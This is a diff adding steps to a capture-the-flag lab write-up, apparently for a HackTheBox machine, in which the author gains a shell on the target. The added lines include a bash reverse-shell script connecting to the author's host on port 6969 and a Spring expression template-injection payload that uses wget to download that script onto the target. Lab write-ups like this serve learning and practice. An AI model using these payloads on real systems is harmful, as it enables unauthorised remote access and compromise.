@@ -144,4 +144,16 @@ gobuster dir -u http://10.129.227.207:8080 -w /usr/share/wordlists/dirbuster/dir
 ```
 * This returned the uids and guids, proving that code execution had been achieved
 * I did a ping test to ensure that I could reach my box: `ping -c 4 10.10.14.13`
+	* That was a success, but no payloads seemed to work
+* I decided to make my payload a `.sh` file and host it on a webserver so I could download it to the box:
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.13/6969 0>&1
+```
+* After hosting it on a webserver I spun up, I used `wget` to download it to the website:
+```
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('wget http://10.10.14.13:8081/urmom.sh').getInputStream())}
+```
+* I checked if I had access to execute the payload and saw that I only had `rw` access
+* I added execute perms and then ran the payload after setting up my listener
 # Root
